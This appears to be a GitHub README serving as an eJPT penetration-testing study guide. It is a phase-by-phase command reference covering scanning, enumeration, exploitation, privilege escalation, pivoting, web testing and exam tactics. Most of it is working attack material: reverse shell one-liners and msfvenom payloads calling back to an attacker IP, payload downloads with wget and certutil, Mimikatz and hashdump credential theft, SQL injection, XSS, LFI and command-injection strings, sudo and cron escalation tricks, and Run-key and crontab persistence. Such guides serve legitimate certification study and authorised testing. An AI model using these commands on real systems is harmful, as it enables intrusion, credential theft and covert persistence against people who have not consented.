# eJPT-Prep-Guide
eJPT (Junior Penetration Tester) preparation and revision guide with practical pentesting commands, Nmap scanning, enumeration, exploitation, Linux &amp; Windows privilege escalation, web application testing, Metasploit, pivoting, and exam tips.



# eJPT Penetration Testing Reference Guide

A practical, no-fluff command reference built while preparing for and passing the eJPT (eLearnSecurity/INE Junior Penetration Tester) certification. Organized by phase — recon, scanning, enumeration, vulnerability assessment, exploitation, privilege escalation, post-exploitation, web app testing, and exam strategy.

> Methodology over memorization: recon → scan → enumerate → identify vulnerabilities → exploit → escalate privileges → pivot → document.

---

## Table of Contents

1. [Networking & Reconnaissance](#1-networking--reconnaissance)
2. [Nmap Scanning](#2-nmap-scanning)
3. [Service Enumeration](#3-service-enumeration)
4. [Vulnerability Assessment](#4-vulnerability-assessment)
5. [Exploitation](#5-exploitation)
6. [Windows Privilege Escalation](#6-windows-privilege-escalation)
7. [Linux Privilege Escalation](#7-linux-privilege-escalation)
8. [Post-Exploitation](#8-post-exploitation)
9. [Web Application Testing](#9-web-application-testing)
10. [Exam Strategy & Time Management](#10-exam-strategy--time-management)
11. [Quick Reference Links](#11-quick-reference-links)

---

## 1. Networking & Reconnaissance

### Network Basics
```bash
ip route show                      # Routing table
ip addr show                       # Interfaces & IPs
dig +short example.com             # DNS resolution
ping -c 4 10.10.10.10              # Connectivity test
traceroute 10.10.10.10
nc -zv 10.10.10.10 80              # Port check
```

### Passive Recon
```bash
whois example.com

# DNS enumeration
dnsrecon -d example.com -t std,brt,srv
dnsrecon -d example.com -t axfr        # Zone transfer attempt

# Subdomain enumeration
amass enum -d example.com -o amass.txt
assetfinder --subs-only example.com

# Certificate transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Google dorks
# site:example.com filetype:pdf
# site:example.com inurl:admin
# site:example.com intitle:"index of"

# theHarvester
theharvester -d example.com -b all -f harvester.html
```

### Active Recon
```bash
# Ping sweep
nmap -sn 10.10.10.0/24 -oA ping-sweep

# ARP scan (local network only)
arp-scan --localnet

# Service & OS discovery
nmap -sV 10.10.10.10
nmap -O 10.10.10.10
```

### Useful One-Liners
```bash
# Extract IPs from a file
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' file.txt | sort -u

# Resolve a list of domains
cat domains.txt | xargs -I {} dig +short {} | sort -u
```

[⬆ back to top](#table-of-contents)

---

## 2. Nmap Scanning

### Host Discovery
```bash
nmap -sn 10.10.10.0/24 -oA ping-sweep   # Ping scan
nmap -PR 10.10.10.0/24                  # ARP scan (LAN, fastest)
nmap -Pn 10.10.10.10                    # Skip host discovery, treat as up
```

### Port Scanning
```bash
nmap -sS 10.10.10.10                    # SYN scan (stealth, needs root)
nmap -sT 10.10.10.10                    # Connect scan (no root)
nmap -sU --top-ports 100 10.10.10.10    # UDP top ports
nmap -p- --min-rate 1000 -T4 10.10.10.10  # All 65535 ports, faster
nmap -p 21,22,80,443,3389 10.10.10.10   # Specific ports
```

### Service, Version & OS Detection
```bash
nmap -sV --version-intensity 9 10.10.10.10
nmap -O 10.10.10.10
nmap -A 10.10.10.10                     # OS + version + scripts + traceroute
```

### Nmap Scripting Engine (NSE)
```bash
nmap --script=safe 10.10.10.10
nmap --script=vuln 10.10.10.10
nmap --script=vuln --script-args=unsafe=1 10.10.10.10
nmap --script=smb-vuln-* -p 445 10.10.10.10
nmap --script=http-* -p 80,443 10.10.10.10
nmap --script=ssl-enum-ciphers -p 443 10.10.10.10
```

### Output & Performance
```bash
nmap 10.10.10.10 -oA basename           # Normal + XML + Greppable output
nmap -T4 10.10.10.10                    # Aggressive timing (recommended)
nmap --min-rate 1000 10.10.10.10
```

### Common Exam-Ready Commands
```bash
# Full TCP + top UDP + scripts + version + OS
nmap -sS -sU --top-ports 100 -sV -O --script=vuln -T4 -p- 10.10.10.10 -oA full-scan

# Quick enum on known ports
nmap -sS -sV -sC -p 21,22,80,139,445,3389 10.10.10.10 -oA quick-enum
```

### Output Parsing
```bash
grep "open" scan.gnmap | cut -d' ' -f2 | sort -u
```

[⬆ back to top](#table-of-contents)

---

## 3. Service Enumeration

### SMB (139, 445)
```bash
enum4linux -a 10.10.10.10
smbmap -H 10.10.10.10
smbclient -L //10.10.10.10 -N
rpcclient -U "" -N 10.10.10.10
  # inside rpcclient: enumdomusers / enumdomgroups / queryuser 0x1f4

# crackmapexec
crackmapexec smb 10.10.10.10 -u user -p pass --shares
crackmapexec smb 10.10.10.10 -u user -p pass -x "whoami"

nmap --script=smb-enum-shares,smb-enum-users,smb-enum-groups -p 445 10.10.10.10
```

### FTP (21)
```bash
ftp 10.10.10.10           # try anonymous:anonymous
nmap --script=ftp-anon -p 21 10.10.10.10
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
```

### SSH (22)
```bash
ssh -v 10.10.10.10
nmap --script=ssh-hostkey,ssh-auth-methods -p 22 10.10.10.10
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

### HTTP/HTTPS (80, 443, 8080, 8443)
```bash
whatweb -a 3 10.10.10.10
nikto -h 10.10.10.10

# Directory enumeration
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302,403

# Virtual host enumeration
ffuf -u http://10.10.10.10 -H "Host: FUZZ.example.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

nmap --script=http-enum,http-title,http-headers -p 80,443 10.10.10.10
openssl s_client -connect 10.10.10.10:443
```

### MySQL (3306)
```bash
mysql -h 10.10.10.10 -u root -p
nmap --script=mysql-info,mysql-enum -p 3306 10.10.10.10
sqlmap -u "http://10.10.10.10/page.php?id=1" --dbs
```

### SMTP (25, 587, 465)
```bash
nc 10.10.10.10 25   # VRFY root / RCPT TO:<user@domain>
nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay -p 25 10.10.10.10
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.10.10
```

### RPC / LDAP
```bash
rpcclient -U "" -N 10.10.10.10
nmap --script=rpcinfo -p 135 10.10.10.10

ldapsearch -x -h 10.10.10.10 -s base namingContexts
nmap --script=ldap-search,ldap-rootdse -p 389 10.10.10.10
```

### RDP / WinRM
```bash
nmap --script=rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 10.10.10.10
xfreerdp /v:10.10.10.10 /u:user /p:pass

evil-winrm -i 10.10.10.10 -u user -p pass
crackmapexec winrm 10.10.10.10 -u user -p pass
```

[⬆ back to top](#table-of-contents)

---

## 4. Vulnerability Assessment

### Nmap Vulnerability Scripts
```bash
nmap --script=vuln 10.10.10.10 -oA nmap-vuln
nmap --script=smb-vuln-ms17-010 -p 445 10.10.10.10   # EternalBlue check
nmap --script=http-vuln* -p 80,443 10.10.10.10
```

### SearchSploit / ExploitDB
```bash
searchsploit "windows 2008 r2"
searchsploit "ms17-010"
searchsploit -x 42315        # View exploit
searchsploit -m 42315        # Copy to current dir
searchsploit -u              # Update database
```

### Manual Checks

**Windows**
```bash
nmap --script=smb2-security-mode -p 445 10.10.10.10   # SMB signing
smbclient -L //10.10.10.10 -N                          # Null sessions
```

**Linux**
```bash
ssh user@10.10.10.10 "uname -a"                        # Kernel version
ssh user@10.10.10.10 "find / -perm -u=s -type f 2>/dev/null"  # SUID
ssh user@10.10.10.10 "sudo -V"                         # Sudo version (CVE checks)
```

**Web Applications**
```
SQLi test:        ' OR '1'='1 --
XSS test:         <script>alert(1)</script>
Directory trav.:  ../../etc/passwd
File upload:      shell.php, shell.php.jpg, shell.phtml
Auth bypass:      admin' -- , default creds (admin/admin)
```

### Kernel Exploit Suggesters
```bash
# Linux
./linux-exploit-suggester.sh
./linpeas.sh

# Windows (on attacker, using target's systeminfo output)
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database mssb.xls --systeminfo systeminfo.txt
```

### Recommended Workflow

| Step | Action | Mandatory / Optional |
|------|--------|----------------------|
| 1 | Quick nmap vuln scan on top ports | Mandatory |
| 2 | Full port scan (`-p-`) + vuln scripts | Mandatory |
| 3 | Service-specific deep scan | Mandatory |
| 4 | Web vuln scan (Nikto / http-vuln*) | Optional (if web ports open) |
| 5 | Searchsploit for each service/version found | Mandatory |
| 6 | Manual verification of critical findings | Mandatory |

### Reporting Template
```
VULNERABILITY REPORT
====================
Target: 10.10.10.10
Scanner: Nmap / Manual

FINDINGS:
1. [CVE-ID] Title
   Port/Service: 445/SMB
   Severity: Critical/High/Medium/Low
   Description: ...
   Evidence: [command output]
   Remediation: Patch / Disable / Configure
```

[⬆ back to top](#table-of-contents)

---

## 5. Exploitation

### Metasploit Framework
```bash
msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
sessions -l
sessions -i 1
```

### MSFVenom Payload Generation
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx

# Avoid bad characters
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -b "\x00\x0a\x0d" -o shell.exe
```

### Multi/Handler
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j -z
```

### Key eJPT-Relevant Exploits

| Target | Module | Notes |
|--------|--------|-------|
| Windows SMBv1 | `exploit/windows/smb/ms17_010_eternalblue` | MS17-010 |
| Windows SMB (creds known) | `exploit/windows/smb/ms17_010_psexec` | More reliable variant |
| Windows RDP | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` | BlueKeep |
| Linux FTP | `exploit/unix/ftp/vsftpd_234_backdoor` | vsftpd 2.3.4 |
| Linux Samba | `exploit/multi/samba/usermap_script` | Samba username map |
| Tomcat | `exploit/multi/http/tomcat_mgr_upload` | Needs manager creds |
| Jenkins | `exploit/multi/http/jenkins_script_console` | Script console RCE |

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'

# Netcat (traditional)
nc -e /bin/bash 10.10.14.5 4444
# If -e unavailable:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### Shell Upgrade (TTY)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z, then: stty raw -echo; fg, then: export TERM=xterm
```

### File Transfer
```bash
# Attacker
python3 -m http.server 80

# Target (Linux)
wget http://10.10.14.5/file
curl -O http://10.10.14.5/file

# Target (Windows)
certutil -urlcache -f http://10.10.14.5/file file
```

[⬆ back to top](#table-of-contents)

---

## 6. Windows Privilege Escalation

### Initial Enumeration
```cmd
systeminfo
whoami /all
net localgroup administrators
wmic qfe get Caption,Description,HotFixID,InstalledOn
tasklist /v
netstat -ano
schtasks /query /fo LIST /v
```

### Automated Tools
```bash
winPEASany.exe quiet cmd applicationsinfo
```

### Common Escalation Vectors

| Vector | Check | Exploit |
|--------|-------|---------|
| Unquoted service path | `wmic service get name,pathname \| findstr /v "c:\windows\\"` | Drop malicious exe in writable path segment |
| Weak service permissions | `accesschk.exe -uwcqv "Everyone" *` | `sc config <svc> binpath= "..."` then `sc start` |
| AlwaysInstallElevated | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Malicious MSI via msfvenom |
| Token impersonation | `SeImpersonatePrivilege` present | PrintSpoofer / Potato family |
| Weak file/registry perms | Manual review | Overwrite binary/DLL |

### Token Impersonation (Meterpreter)
```bash
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getsystem
```

### Credential Dumping
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# Search for creds in files
findstr /si password *.xml *.ini *.config *.txt 2>nul
```

### Registry Checks
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

### Checklist
```
[ ] systeminfo + exploit suggester for kernel exploits
[ ] winPEAS / automated enumeration
[ ] Unquoted service paths
[ ] Weak service permissions
[ ] AlwaysInstallElevated
[ ] Token impersonation (getsystem, Potato family)
[ ] Credential dumping (Mimikatz)
[ ] Registry: AutoLogon, PuTTY, RDP, Run keys
[ ] Scheduled tasks / startup folder writable?
```

[⬆ back to top](#table-of-contents)

---

## 7. Linux Privilege Escalation

### Initial Enumeration
```bash
uname -a
cat /etc/os-release
id
sudo -l
cat /etc/crontab
find / -writable -type d 2>/dev/null | head -20
```

### Automated Tools
```bash
./linpeas.sh -a
./linux-exploit-suggester.sh
./lse.sh -l 2
./pspy64 -pf -i 1000     # process monitoring, no root needed
```

### Kernel Exploits Worth Knowing

| CVE | Name | Affected |
|-----|------|----------|
| CVE-2022-0847 | Dirty Pipe | Kernel 5.8–5.16.11, 5.17.1 |
| CVE-2016-5195 | Dirty Cow | Kernel < 4.8.3 |
| CVE-2021-4034 | PwnKit (Polkit pkexec) | Most distros 2009–2022 |

### SUID/SGID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```
Check any hits against [GTFOBins](https://gtfobins.github.io/).

### Sudo Exploitation
```bash
sudo -l
# GTFOBins-style examples (if binary is NOPASSWD):
sudo vim -c ':!/bin/bash'
sudo find . -exec /bin/bash \;
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
sudo env /bin/bash -p

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit) — check first: sudo -V
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid example:
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
# If a cron script is writable:
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /path/to/writable/script.sh
```

### NFS Root Squashing
```bash
cat /etc/exports
# Look for: /path *(rw,no_root_squash)
```

### Password Hunting
```bash
cat ~/.bash_history
find / -name "id_rsa" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
```

### Checklist
```
[ ] uname -a + exploit suggester for kernel exploits
[ ] linpeas / lse / automated enumeration
[ ] SUID binaries (GTFOBins)
[ ] sudo -l (GTFOBins + known sudo CVEs)
[ ] Capabilities (getcap -r /)
[ ] Cron jobs (writable scripts, wildcard injection)
[ ] NFS no_root_squash
[ ] Password/key hunting
[ ] Polkit (PwnKit)
```

[⬆ back to top](#table-of-contents)

---

## 8. Post-Exploitation

### Meterpreter Basics
```bash
sysinfo
getuid
getsystem
ps
migrate <PID>
download <file>
upload <file>
search -f flag.txt
screenshot
```

### Credential Access

**Windows**
```bash
hashdump
load kiwi
creds_all
```

**Linux**
```bash
cat /etc/shadow          # crack with john --wordlist=rockyou.txt
find / -name "id_rsa" 2>/dev/null
cat ~/.bash_history
```

### Pivoting

```bash
# Meterpreter autoroute
run post/multi/manage/autoroute SUBNET=10.10.20.0 NETMASK=255.255.255.0 SESSION=1

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.20.10

# SSH tunneling
ssh -D 1080 user@10.10.10.10                 # Dynamic SOCKS
ssh -L 8080:10.10.20.10:80 user@10.10.10.10  # Local forward

# Chisel (useful when SSH isn't available)
./chisel server -p 8000 --reverse           # attacker
./chisel client 10.10.14.5:8000 R:socks     # target
```

### Persistence

**Windows**
```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d "C:\Windows\Temp\shell.exe"
schtasks /create /sc minute /mo 1 /tn "Update" /tr "C:\Windows\Temp\shell.exe" /ru SYSTEM
```

**Linux**
```bash
echo "* * * * * /tmp/shell.sh" | crontab -
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

### Lateral Movement
```bash
# Pass-the-hash
crackmapexec smb 10.10.10.10 -u Administrator -H HASH -x "whoami"

# Impacket
impacket-psexec DOMAIN/user@target -hashes :HASH
impacket-wmiexec DOMAIN/user@target -hashes :HASH

evil-winrm -i target -u user -H HASH
```

[⬆ back to top](#table-of-contents)

---

## 9. Web Application Testing

### Reconnaissance
```bash
whatweb -a 3 http://10.10.10.10
curl -I http://10.10.10.10
curl http://10.10.10.10/robots.txt
```
CMS fingerprints: WordPress (`/wp-admin/`, `/wp-content/`), Joomla (`/administrator/`), Drupal (`CHANGELOG.txt`).

### Directory & File Enumeration
```bash
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,sql
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403
```

### SQL Injection

**Detection**
```
' OR '1'='1' --
' AND (SELECT SLEEP(5)) --      # time-based
```

**Manual Union-Based (MySQL)**
```sql
' UNION SELECT NULL,NULL,NULL -- -
' UNION SELECT table_name,2,3 FROM information_schema.tables -- -
' UNION SELECT username,password,3 FROM users -- -
```

**SQLMap**
```bash
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs
sqlmap -u "http://10.10.10.10/page.php?id=1" --dump -D dbname -T tablename
sqlmap -r request.txt          # from a saved Burp request
```

### XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Authentication Attacks
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```
Try SQLi auth bypass (`admin' --`) and default creds before brute-forcing.

### Directory Traversal / LFI
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

### File Upload Bypass
```
shell.php.jpg
shell.phtml
shell.pht
```
Also try MIME-type spoofing and double extensions.

### Command Injection
```
; id
| id
$(id)
`id`
```

### SSRF
```
http://127.0.0.1:80
http://169.254.169.254/        # cloud metadata endpoint
```

### OWASP Top 10 Focus Areas
1. Broken Access Control — IDOR, path traversal, force browsing
2. Cryptographic Failures — weak TLS, sensitive data exposure
3. Injection — SQLi, command injection, XSS
4. Security Misconfiguration — default creds, verbose errors
5. Vulnerable Components — outdated libraries, known CVEs
6. Auth Failures — weak passwords, session fixation
7. SSRF — server-side request forgery

[⬆ back to top](#table-of-contents)

---

## 10. Exam Strategy & Time Management

> Applies broadly to any timed, black-box, practical pentest exam (eJPT, similar OSCP-style formats).

### Time Blocking (example for a 48-hour window)

| Phase | Time | Focus |
|-------|------|-------|
| 1 | 0–4h | Recon & full port scans on all targets |
| 2 | 4–12h | Service enumeration, vuln scanning |
| 3 | 12–24h | Exploitation — get shells |
| 4 | 24–36h | Privilege escalation, pivoting, credential harvesting |
| 5 | 36–44h | Web application testing |
| 6 | 44–48h | Verify findings/flags, review, submit |

### General Rules
- Don't spend more than ~1–2 hours stuck on one target/question — flag it and move on.
- Always scan **all 65535 TCP ports**, not just top ports.
- Don't skip UDP — at minimum scan the top 100 UDP ports.
- Run automated enumeration (LinPEAS/WinPEAS) before guessing privesc paths.
- Upgrade shells to a full TTY immediately after landing one.
- Pivot into internal networks — don't assume the DMZ is the whole scope.
- Document every command and output as you go; don't try to reconstruct later.

### Flag/Evidence Hunting Checklist
```
[ ] Check common flag locations (home dirs, desktop, web root)
[ ] Search filesystem: find / -name "*flag*" 2>/dev/null
[ ] Check database tables for a flag column
[ ] Check config files (.env, wp-config.php)
[ ] Check SMB/FTP shares
[ ] Screenshot every flag + the command that found it
```

### Common Mistakes to Avoid
1. Meeting the overall pass percentage but missing a per-domain minimum.
2. Only scanning top ports and missing services on high ports.
3. Ignoring UDP entirely.
4. Rabbit-holing on one vector for too long.
5. Not upgrading shells before attempting privesc.
6. Forgetting to pivot into internal subnets.
7. Skipping automated enumeration tools and guessing instead.
8. Not documenting commands/output as you go.

[⬆ back to top](#table-of-contents)

---

## 11. Quick Reference Links

- [GTFOBins](https://gtfobins.github.io/) — Linux privesc via legitimate binaries
- [LOLBAS](https://lolbas-project.github.io/) — Windows privesc via legitimate binaries
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [Reverse Shell Generator](https://www.revshells.com/)

[⬆ back to top](#table-of-contents)

---

*This guide reflects methodology and commands used while preparing for the eJPT certification. Use only against systems you are authorized to test.*
